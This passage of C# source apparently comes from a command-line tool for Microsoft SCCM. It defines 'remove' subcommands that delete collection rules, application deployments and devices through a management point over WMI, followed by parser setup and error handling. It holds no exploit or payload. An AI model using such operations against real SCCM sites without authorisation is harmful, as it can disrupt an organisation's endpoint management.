                                Cleanup.RemoveCollectionMember(wmiConnection, collectionName, collectionType, collectionId, device, user, resourceId, waitTime == 0 ? 15 : waitTime);
                            }
                        }
                    });


                // remove collection-rule
                var removeCollectionRule = new Command("collection-rule", "Remove a device from a collection rule by contacting a management point via WMI (currently supports Query type rules only)\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Infrastructure Administrator\n" +
                    "    - Operations Administrator\n" +
                    "    - Security Administrator\n");
                removeCommand.Add(removeCollectionRule);
                removeCollectionRule.Add(new Option<string>(new[] { "--collection-id", "-i" }, "The CollectionID of the collection to remove the resource from (e.g., \"PS100020\")") { IsRequired = true });
                removeCollectionRule.Add(new Option<string>(new[] { "--query-id", "-q" }, "The QueryID of the rule to remove from the specified collection") { IsRequired = true });
                removeCollectionRule.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string collectionId, string queryId) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            Cleanup.RemoveCollectionRule(wmiConnection, collectionId, queryId);
                        }
                    });

                // remove deployment
                var removeDeployment = new Command("deployment", "Delete a deployment of a specified application to a specified collection by contacting a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Application Deployment Manager\n" +
                    "    - Operations Administrator");
                removeCommand.Add(removeDeployment);
                removeDeployment.Add(new Argument<string>("name", "The exact AssignmentName of the deployment"));
                removeDeployment.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string name) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            Cleanup.RemoveDeployment(wmiConnection, name);
                        }
                    });

                // remove device
                var removeDevice = new Command("device", "Remove a device from SCCM by contacting a management point via WMI\n" +
                    "  Permitted security roles:\n" +
                    "    - Full Administrator\n" +
                    "    - Application Administrator\n" +
                    "    - Infrastructure Administrator\n" +
                    "    - Operations Administrator");
                removeCommand.Add(removeDevice);
                removeDevice.Add(new Argument<string>("guid", "The GUID of the device to remove (e.g., \"GUID:AB424B0D-F582-4020-AA26-71D32EA07683\""));
                removeDevice.Handler = CommandHandler.Create(
                    (string managementPoint, string siteCode, string guid) =>
                    {
                        ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(managementPoint, null, siteCode);
                        if (wmiConnection != null && wmiConnection.IsConnected)
                        {
                            Cleanup.RemoveDevice(wmiConnection, guid);
                        }
                    });

                // Execute
                //var commandLine = new CommandLineBuilder(rootCommand).UseDefaults().Build();
                var commandLine = new CommandLineBuilder(rootCommand)
                   .UseVersionOption()
                   .UseHelp()
                   //.UseEnvironmentVariableDirective()
                   //.UseParseDirective()
                   //.UseSuggestDirective()
                   //.RegisterWithDotnetSuggest()
                   .UseTypoCorrections()
                   .UseParseErrorReporting()
                   .CancelOnProcessTermination()
                   .Build();
                commandLine.Invoke(args);

                // Stop timer and complete execution
                timer.Stop();
                Console.WriteLine($"[+] Completed execution in {timer.Elapsed}");

                // Delay completion when debugging
                if (Debugger.IsAttached)
                    Console.ReadLine();

                // Flush any pending trace messages, remove the console trace listener from the collection, and close the console trace listener.
                if (debug)
                {
                    Trace.Flush();
                    Trace.Listeners.Remove(consoleTracer);
                    consoleTracer.Close();
                    Trace.Close();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] An unhandled exception of type {ex.GetType()} occurred: {ex.Message}");
                if (debug)
                {
                    Console.WriteLine(ex.StackTrace);
                    Console.WriteLine();
                    Console.WriteLine(ex.InnerException);
                }
            }
        }   
    }
}